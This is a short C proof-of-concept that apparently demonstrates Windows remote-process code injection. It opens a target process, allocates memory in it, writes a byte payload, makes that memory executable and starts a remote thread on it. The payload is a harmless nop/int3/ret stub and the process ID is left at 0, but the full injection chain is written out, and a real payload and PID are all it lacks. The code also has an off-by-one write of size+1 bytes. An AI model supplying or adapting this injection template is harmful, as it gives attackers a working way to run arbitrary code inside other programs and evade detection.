/**
 * Creator:    VPR
 * Created:    November 21, 2021
 * Updated:    November 22, 2021
 *
 * Disclaimer:
 *     This program was designed as a proof-of-concept. It doesn't do anything
 *     malicious and it is not intended to do so. Don't try to use it for any
 *     malicious or illegal activity.
**/

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#endif
#include <stdlib.h>
#include <stdio.h>

int main(void)
{
    DWORD old_protect = 0;
    DWORD process_id  = 0;
    BOOL bSuccess     = 0;
    HANDLE hProcess   = NULL;
    HANDLE hThread    = NULL;
    void* exec_mem    = NULL;

    unsigned char payload[4] = {
        0x90,  // nop
        0x90,  // nop
        0xCC,  // int3
        0xC3   // ret
    };
    size_t size = 4;

    if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, process_id)))
    {
        CloseHandle(hProcess);
        return -1;
    }

    if (!(exec_mem = VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        CloseHandle(hProcess);
        return -1;
    }

    if (!(WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
    {
        return -1;
    }

    if (!(bSuccess = VirtualProtectEx(hProcess, exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
    {
        return -1;
    }

    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
    {
        return -1;
    }
    
    CloseHandle(hProcess);
    return 0;
}
